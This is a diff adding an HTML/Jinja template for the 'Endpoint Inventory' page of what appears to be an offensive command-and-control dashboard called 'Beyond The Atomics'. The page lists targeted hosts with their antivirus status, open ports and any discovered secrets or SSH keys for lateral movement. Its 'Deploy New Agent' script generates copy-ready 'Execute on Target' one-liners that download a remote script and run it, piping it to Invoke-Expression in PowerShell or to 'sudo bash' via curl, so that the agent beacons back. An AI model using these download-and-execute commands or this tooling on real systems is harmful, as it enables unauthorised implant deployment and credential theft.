@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discovered Targets | Beyond The Atomics</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root {
+            --glass-bg: rgba(15, 23, 42, 0.75);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --neon-blue: #38bdf8;
+            --neon-purple: #818cf8;
+        }
+
+        body {
+            background-color: #020617;
+            color: #e2e8f0;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        
+        
+
+        
+
+        
+
+        .glass {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.6);
+        }
+    
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            background:
+                radial-gradient(circle at 20% 30%, rgba(56, 189, 248, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(129, 140, 248, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 50% 50%, rgba(15, 23, 42, 1) 0%, #020617 100%);
+        }
+
+        .blob {
+            position: fixed;
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(to right, var(--neon-blue), var(--neon-purple));
+            filter: blur(80px);
+            border-radius: 50%;
+            z-index: -1;
+            opacity: 0.2;
+            animation: float 20s infinite alternate;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+
+            100% {
+                transform: translate(100px, 50px) scale(1.1);
+            }
+        }
+
+</style>
+<!-- FOUC Prevention & Animation Styles -->
+    <style>
+        @keyframes instantFade {
+            0% { opacity: 0; transform: translateY(10px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Apply instant simultaneous fade to all main elements, no delays, incredibly fast */
+        .glass:not(nav, nav .glass, #smart-tooltip), .ttp-card, .asset-card, tbody tr {
+            animation: instantFade 0.25s ease-out forwards;
+        }
+    </style>
+
+    <!-- Theme Engine -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='theme.css') }}">
+    <script src="{{ url_for('static', filename='theme.js') }}"></script>
+</head>
+<body class="p-4 md:p-8">
+
+    <div class="bg-overlay"></div>
+    <div class="blob" style="top: -100px; left: -100px;"></div>
+    <div class="blob" style="bottom: -100px; right: -100px; animation-delay: -5s;"></div>
+
+    
+    
+    
+
+    {% include 'nav.html' %}
+
+    <div class="max-w-7xl mx-auto">
+        <div id="deployModal" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 bg-black/60 backdrop-blur-md overflow-hidden">
+            <div class="glass max-w-2xl w-full max-h-[90vh] overflow-y-auto p-8 rounded-[2.5rem] border-white/10 relative animate-fade-in custom-scrollbar">
+                <button onclick="toggleModal()" class="absolute top-6 right-6 text-slate-400 hover:text-white transition-colors">
+                    <i data-lucide="x" class="w-6 h-6"></i>
+                </button>
+                
+                <h2 class="text-2xl font-black text-white mb-2">Deploy New Agent</h2>
+                <p class="text-slate-400 text-sm mb-8">Select target platform to generate the deployment one-liner.</p>
+
+                <div class="grid grid-cols-2 gap-6 mb-8">
+                    <button onclick="showCmd('windows')" class="p-6 bg-white/5 border border-white/10 rounded-3xl hover:border-blue-500/50 hover:bg-blue-500/5 transition-all group text-center">
+                        <img src="/static/windows.png" class="w-12 h-12 mx-auto mb-3 opacity-60 group-hover:opacity-100 transition-opacity">
+                        <span class="block font-bold text-white">Windows</span>
+                    </button>
+                    <button onclick="showCmd('linux')" class="p-6 bg-white/5 border border-white/10 rounded-3xl hover:border-orange-500/50 hover:bg-orange-500/5 transition-all group text-center">
+                        <img src="/static/linux.png" class="w-12 h-12 mx-auto mb-3 opacity-60 group-hover:opacity-100 transition-opacity">
+                        <span class="block font-bold text-white">Linux / Kali</span>
+                    </button>
+                </div>
+
+                <div id="commandBox" class="hidden mt-8 p-8 glass rounded-[2rem] border-blue-500/30">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="text-blue-400 text-[10px] font-black uppercase tracking-widest">Execute on Target:</h3>
+                        <button onclick="copyCommand(this)" class="text-slate-400 hover:text-white flex items-center justify-center bg-white/5 hover:bg-white/10 w-7 h-7 rounded-lg border border-white/10 transition-colors" title="Copy Command">
+                            <i data-lucide="copy" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                    <div class="bg-black/60 border border-white/5 p-6 rounded-2xl relative max-h-48 overflow-y-auto custom-scrollbar group">
+                     <code id="cmdText" class="text-xs terminal-font text-green-400 break-all leading-relaxed"></code>
+                 </div>
+            <p class="mt-4 text-[10px] text-slate-500 italic">
+                The agent will automatically beacon back to <span id="footerIp" class="text-blue-400 font-bold"></span>
+            </p>
+        </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="pt-8">
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-12">
+                <div>
+                    <h1 class="text-4xl font-black text-white mb-2 tracking-tight flex items-center gap-3">
+                        <span class="p-2.5 bg-blue-500/10 rounded-2xl">
+                            <i data-lucide="monitor" class="text-blue-400 w-8 h-8"></i>
+                        </span>
+                        Endpoint Inventory
+                    </h1>
+                    <p class="text-slate-400">Manage and monitor discovered assets across the network.</p>
+                </div>
+                <button onclick="toggleModal()" class="flex items-center gap-2 px-6 py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-bold transition-all shadow-lg shadow-blue-600/20 group">
+                    <i data-lucide="plus-circle" class="w-5 h-5 group-hover:rotate-90 transition-transform"></i>
+                    Deploy New Agent
+                </button>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            {% for asset in assets %}
+            <div class="asset-card glass p-8 rounded-[2rem] relative overflow-hidden group hover:border-blue-500/40 transition-all duration-500 hover:-translate-y-1">
+                <!-- Visual highlight bar -->
+                <div class="absolute top-0 left-0 w-1.5 h-full bg-gradient-to-b from-blue-500 to-purple-600 opacity-70 group-hover:opacity-100 transition-opacity"></div>
+                
+                <!-- Header Section -->
+                <div class="flex justify-between items-start mb-6">
+                    <div class="flex items-center gap-4">
+                        <div class="p-3 bg-white/5 rounded-2xl group-hover:bg-blue-500/20 transition-colors">
+                            <i data-lucide="monitor" class="text-slate-400 group-hover:text-blue-400 w-6 h-6 transition-colors"></i>
+                        </div>
+                        <div>
+                            <div class="flex items-center gap-3">
+                                <h2 class="text-2xl font-bold text-white group-hover:text-blue-300 transition-colors terminal-font">
+                                    {{ asset.hostname }}
+                                </h2>
+    
+                                <!-- Heartbeat Dot -->
+                                {% if asset.status == 'Online' %}
+                                    <span class="flex h-3 w-3 relative" title="Online">
+                                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                                        <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500 shadow-[0_0_8px_#22c55e]"></span>
+                                    </span>
+                                {% else %}
+                                    <span class="flex h-3 w-3 relative" title="Offline">
+                                        <span class="relative inline-flex rounded-full h-3 w-3 bg-slate-600 border border-slate-500"></span>
+                                    </span>
+                                {% endif %}
+                            </div>
+                            <div class="flex items-center gap-2 mt-1">
+                                <div class="w-1.5 h-1.5 bg-blue-500 rounded-full animate-pulse"></div>
+                                <p class="text-blue-400 font-bold terminal-font text-sm tracking-wider">
+                                    {{ asset.ip }}
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="flex flex-col items-end gap-2">
+                        <div class="flex gap-2">
+                            <button onclick="removeAgent('{{ asset.hostname }}')" class="p-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 rounded-lg text-red-400 transition-all title='Remove Agent'">
+                                <i data-lucide="trash-2" class="w-3.5 h-3.5"></i>
+                            </button>
+                            <span class="text-[10px] font-black bg-slate-800 text-slate-300 px-3 py-1 rounded-full uppercase tracking-widest border border-white/5 shadow-inner">
+                                {{ asset.os | upper }}
+                            </span>
+                        </div>
+                        <span class="text-[10px] font-black uppercase tracking-widest px-3 py-1 rounded-full border 
+                            {% if asset.asset_classification == 'Public Facing Server' %} bg-red-500/20 text-red-400 border-red-500/30
+                            {% elif asset.asset_classification == 'Internal Server' %} bg-amber-500/20 text-amber-400 border-amber-500/30
+                            {% else %} bg-blue-500/20 text-blue-400 border-blue-500/30 {% endif %}">
+                            {{ asset.asset_classification or 'User Workstation' }}
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Intelligence Grid (Organized View) -->
+                <div class="grid grid-cols-2 gap-3 mb-5">
+                    
+                    <!-- Identity & Privileges -->
+                    <div class="bg-black/30 border border-white/5 p-3.5 rounded-xl hover:border-purple-500/30 transition-colors flex flex-col justify-center">
+                        <div class="flex items-center gap-2 mb-1">
+                            <i data-lucide="user" class="w-4 h-4 text-purple-400"></i>
+                            <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Identity Context</span>
+                        </div>
+                        <div class="pl-6 space-y-0.5">
+                            <p class="text-sm font-bold text-slate-300 truncate">Normal User</p>
+                            <p class="text-[10px] text-slate-500 font-mono tracking-tighter">{{ asset.domain or 'Local Workgroup' }}</p>
+                        </div>
+                    </div>
+
+                    <!-- Environment & Hardware -->
+                    <div class="bg-black/30 border border-white/5 p-3.5 rounded-xl hover:border-green-500/30 transition-colors flex flex-col justify-center">
+                        <div class="flex items-center gap-2 mb-1">
+                            <i data-lucide="cpu" class="w-4 h-4 text-green-400"></i>
+                            <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">System Info</span>
+                        </div>
+                        <div class="pl-6 space-y-0.5">
+                            <p class="text-[10px] text-slate-300 truncate">CPU: {{ asset.sysinfo.cpu }}</p>
+                            <p class="text-[10px] text-slate-300">RAM: {{ asset.sysinfo.ram }} | Disk: {{ asset.sysinfo.storage }}</p>
+                        </div>
+                    </div>
+
+                    <!-- Defenses (Platform Specific Swap) -->
+                    <div class="bg-black/30 border border-white/5 p-3.5 rounded-xl hover:border-blue-500/30 transition-colors flex flex-col justify-center">
+                        <div class="flex items-center gap-2 mb-1">
+                            {% if asset.os | lower == 'windows' %}
+                                <i data-lucide="shield-check" class="w-4 h-4 text-blue-400"></i>
+                                <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">AV Status</span>
+                            {% else %}
+                                <i data-lucide="shield-off" class="w-4 h-4 text-slate-500"></i>
+                                <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Antivirus</span>
+                            {% endif %}
+                        </div>
+                        <span class="text-sm font-bold pl-6 truncate">
+                            {% if asset.os | lower == 'windows' %}
+                                {% if asset.has_security_tools | lower == 'true' %}
+                                    <span class="text-blue-300">{{ asset.detected_tools }}</span>
+                                {% else %}
+                                    <span class="text-red-400">No AV Detected</span>
+                                {% endif %}
+                            {% else %}
+                                <span class="text-red-400">No AV Detected</span>
+                            {% endif %}
+                        </span>
+                    </div>
+
+                    <!-- Network Ports -->
+                    <div class="bg-black/30 border border-white/5 p-3.5 rounded-xl hover:border-indigo-500/30 transition-colors flex flex-col justify-center">
+                        <div class="flex items-center gap-2 mb-1">
+                            <i data-lucide="network" class="w-4 h-4 text-indigo-400"></i>
+                            <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Open Ports</span>
+                        </div>
+                        <div class="pl-6 flex flex-wrap gap-1">
+                            {% for port in asset.ports[:5] %}
+                                <span class="text-[9px] font-mono bg-indigo-500/10 text-indigo-300 px-1 rounded border border-indigo-500/20">{{ port.port }}</span>
+                            {% else %}
+                                <span class="text-[10px] text-slate-500 italic">None</span>
+                            {% endfor %}
+                            {% if asset.ports|length > 5 %}<span class="text-[9px] text-slate-500">+{{ asset.ports|length - 5 }}</span>{% endif %}
+                        </div>
+                    </div>
+
+                    <!-- Lateral Movement / Secrets -->
+                    <div class="bg-black/30 border border-white/5 p-3.5 rounded-xl hover:border-red-500/30 transition-colors col-span-2">
+                        <div class="flex items-center gap-2 mb-2">
+                            <i data-lucide="key" class="w-4 h-4 {% if asset.has_secrets_or_keys | lower == 'true' %}text-red-400 animate-pulse{% else %}text-slate-500{% endif %}"></i>
+                            <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Secrets & Lateral Movement</span>
+                        </div>
+                        <div class="pl-6 text-xs font-medium {% if asset.has_secrets_or_keys | lower == 'true' %}text-red-300{% else %}text-slate-400{% endif %} flex items-center gap-2">
+                            {% if asset.has_secrets_or_keys | lower == 'true' %}
+                                <span class="bg-red-500/20 text-red-400 px-2 py-1 rounded border border-red-500/30">Secrets Found!</span>
+                                <span>SSH keys or Env Vars detected.</span>
+                            {% else %}
+                                <span>No explicit secrets found in default paths.</span>
+                            {% endif %}
+                        </div>
+                    </div>
+                </div>
+                <div class="flex justify-between items-center pt-5 mt-5 border-t border-white/5">
+                    <span class="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
+                        <span class="w-1.5 h-1.5 rounded-full bg-blue-500 animate-ping inline-block"></span>
+                        Target Active & Indexed
+                    </span>
+                    <i data-lucide="radio" class="w-4 h-4 text-blue-500/70"></i>
+                </div>
+            </div>
+            {% else %}
+            <!-- Empty State -->
+            <div class="col-span-full text-center p-20 glass rounded-[3rem] border-dashed border-white/10 mt-10">
+                <div class="bg-slate-800/50 w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-8">
+                    <i data-lucide="radar" class="text-blue-500/50 w-12 h-12 animate-[spin_3s_linear_infinite]"></i>
+                </div>
+                <h3 class="text-2xl font-bold text-white mb-3">No Targets Discovered</h3>
+                <p class="text-slate-500 max-w-sm mx-auto leading-relaxed">
+                    Deploy an agent on endpoints to map the attack surface and hunt for security gaps.
+                </p>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <script>
+        // Initialize Lucide Icons
+        lucide.createIcons();
+        
+        // Staggered animation for cards
+        document.addEventListener('DOMContentLoaded', () => {
+            const cards = document.querySelectorAll('.asset-card');
+            cards.forEach((card, index) => {
+                setTimeout(() => {
+                    card.style.opacity = '1';
+                }, index * 100);
+            });
+        });
+
+function toggleModal() {
+    const modal = document.getElementById('deployModal');
+    modal.classList.toggle('hidden');
+    modal.classList.toggle('flex');
+}
+
+        function copyCommand(btn) {
+            const textToCopy = document.getElementById('cmdText').innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                btn.innerHTML = '<i data-lucide="check" class="w-4 h-4 text-green-400"></i>';
+                lucide.createIcons();
+                
+                setTimeout(() => {
+                    btn.innerHTML = '<i data-lucide="copy" class="w-4 h-4"></i>';
+                    lucide.createIcons();
+                }, 2000);
+            });
+        }
+
+        async function removeAgent(hostname) {
+            if (!confirm(`Are you sure you want to remove agent '${hostname}'? This will delete all associated reconnaissance data.`)) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/agent/${hostname}/delete`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+                if (data.status === 'success') {
+                    // Reload page to update inventory
+                    window.location.reload();
+                } else {
+                    alert('Error: ' + data.message);
+                }
+            } catch (err) {
+                console.error('Failed to remove agent:', err);
+                alert('An error occurred while removing the agent.');
+            }
+        }
+
+        function showCmd(platform) {
+    const box = document.getElementById('commandBox');
+    const text = document.getElementById('cmdText');
+    const footer = document.getElementById('footerIp');
+    
+    const serverIp = "{{ server_ip }}"; 
+    const serverUrl = "http://" + serverIp + ":5000";
+
+    box.classList.remove('hidden');
+    if (footer) footer.innerText = serverUrl;
+
+    if (platform === 'windows') {
+        text.innerText = `powershell.exe -c "Invoke-RestMethod -Uri '${serverUrl}/scripts/win' | Invoke-Expression"`;
+    } else {
+        text.innerText = `curl -s ${serverUrl}/scripts/linux | sudo bash`;
+    }
+}
+    </script>
+
+    
+
+<!-- Global Cascade Animation & Active Nav Link -->
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // 1. Navigation Active Link Highlight
+        const currentPath = window.location.pathname;
+        const navLinks = document.querySelectorAll('nav a');
+        
+        navLinks.forEach(link => {
+            const href = link.getAttribute('href');
+            if (!href) return;
+            
+            let isActive = false;
+            if (href === '/') {
+                if (currentPath === '/') isActive = true;
+            } else {
+                if (currentPath.startsWith(href)) isActive = true;
+            }
+            
+            if (isActive) {
+                link.classList.remove('text-slate-400');
+                link.classList.add('text-blue-400');
+                link.style.textShadow = '0 0 15px rgba(56, 189, 248, 0.8)';
+            }
+        });
+
+        
+    });
+    </script>
+</body>
+</html>
